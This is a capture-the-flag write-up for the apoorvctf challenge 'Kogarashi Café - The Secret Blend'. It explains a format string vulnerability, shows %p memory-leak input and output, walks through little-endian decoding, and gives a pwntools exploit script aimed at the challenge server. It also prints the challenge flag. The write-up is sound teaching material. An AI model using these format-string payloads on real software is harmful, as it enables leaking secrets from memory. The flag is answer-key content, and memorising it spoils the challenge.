# Kogarashi Café - The Secret Blend

## Description
Not everything on the menu is meant to be seen.

- Author: Suraj
- flag: apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}

**Category : Binary Exploitation**

## Writeup

## Challenge Overview

In this challenge, we're given a binary called `secret_blend`. Our goal is to exploit a format string vulnerability to extract a flag that's loaded into memory but not directly printed to us.

## Initial Analysis

Let's first run the binary to see what it does:

```
$ ./secret_blend
Welcome to Kogarashi Café.
Barista: 'What will you have?'
test
test
```

The program prompts us for input, then echoes it back before exiting. This simple interface might hide a vulnerability.

## Identifying the Format String Vulnerability

Format string vulnerabilities occur when user input is directly passed to functions like `printf()` without a proper format string. Let's test if this program has such a vulnerability by providing format specifiers as input:

```
$ ./secret_blend
Welcome to Kogarashi Café.
Barista: 'What will you have?'
%x %x %x %x
64 f7fb7580 804c000 f7fb0000
```

Success! Instead of printing the literal string "%x %x %x %x", the program interpreted our format specifiers and leaked values from the stack. This confirms a classic format string vulnerability.

## Understanding Format String Vulnerabilities

When a format string vulnerability exists, we can use format specifiers to:
1. Read data from the stack (%x, %p, %s)
2. Read from arbitrary memory addresses (%s with address)
3. Even write to memory (%n) - though we won't need this for this challenge

In this case, we're most interested in reading data from the stack to find our flag.

## Exploiting the Vulnerability - Memory Leak

Since we know the program reads the flag into memory, our strategy is to use the `%p` format specifier to dump memory contents and look for the flag. The `%p` specifier prints addresses in a readable format, which can help us identify memory patterns.

Let's try to leak a large portion of memory:

```
$ ./secret_blend
Welcome to Kogarashi Café.
Barista: 'What will you have?'
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
0x64 0xf7eaa5c0 0xf7cf9b55 0xf7eaad40 0xf7eaad87 0x6f6f7061 0x74637672 0x68547b66 0x334d5f33 0x4c5f756e 0x736b3433 0x72304d5f 0x68545f65 0x495f6e61 0x68535f74 0x646c7530 0xf7ea007d 0xffa1b8a8 0xf7cfabf7 0x1 (nil) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 
```

## Decoding Hex Values and Finding the Flag

When we convert these hex values to ASCII, we get something like:

```
d÷ê¥À÷ÏU÷ê­@÷ê­oopatcvrhT{f3M_3L_unsk43r0M_hT_eI_nahS_tdlu0÷ê}ÿ¡¸¨÷Ï«÷% p%p% p p% % p%p% p p% % p%p% p p% % p%p% p p% 
```

Looking at this output, we can see what appears to be parts of the flag: `oopatcvrhT{f3M_3L_unsk43r0M_hT_eI_nahS_tdlu0`. However, this doesn't look quite right. The text is scrambled because of endianness issues.

## Understanding Endianness

In computer systems, multi-byte values can be stored in two ways:
- **Little-endian**: The least significant byte is stored first
- **Big-endian**: The most significant byte is stored first

Most x86 and x86-64 systems use little-endian format. When we dump memory using `%p` and then convert it to ASCII, we need to account for this endianness.

Looking at our decoded output, we can see what looks like a scrambled version of "apoorvctf{something}". The characters are not in the right order because they're stored in little-endian format, meaning we need to flip each 4-byte chunk to read it correctly.

## Extracting the Flag

To extract the flag properly, we need to:
1. Identify the 4-byte chunks that contain the flag
2. Reverse the byte order in each chunk
3. Concatenate them to form the complete flag

For example, if we see the bytes:
```
0x6f6f7061 0x74637672 0x68547b66 0x334d5f33 0x4c5f756e 0x736b3433 0x72304d5f 0x68545f65 0x495f6e61 0x68535f74 0x646c7530
```

If we reverse each 4-byte group to get:
```
apoorvctf{Th3_M3nu_L34ks_M0re_Than_It_Sh0uld}
```

## Exploit Script

Here's a Python script that automates the exploitation process:

```python
from pwn import *

#p = process('./secret_blend')
p = remote('chals1.apoorvctf.xyz', 3003)

p.sendline(b"%p " * 40)

output = p.recvall(timeout=2).decode(errors='ignore')

# Extract all hexadecimal values
import re
hex_values = re.findall(r'0x[0-9a-fA-F]+', output)

flag_parts = []
for val in hex_values:
    if len(val) > 2:
        try:
            bytes_val = bytes.fromhex(val[2:])[::-1]
            flag_parts.append(bytes_val)
        except:
            pass

raw_text = b"".join(flag_parts).decode(errors='ignore')

if "apoorvctf{" in raw_text:
    flag_start = raw_text.find("apoorvctf{")
    flag_end = raw_text.find("}", flag_start) + 1
    flag = raw_text[flag_start:flag_end]
    print(f"Flag: {flag}")
else:
    print("Flag not found")

p.close()
```

Running this script against the remote server will automatically extract and print the flag.

## Conclusion

This challenge demonstrates a classic format string vulnerability. By using format specifiers like %p, we were able to leak memory contents and extract the flag that was stored in the program's memory.
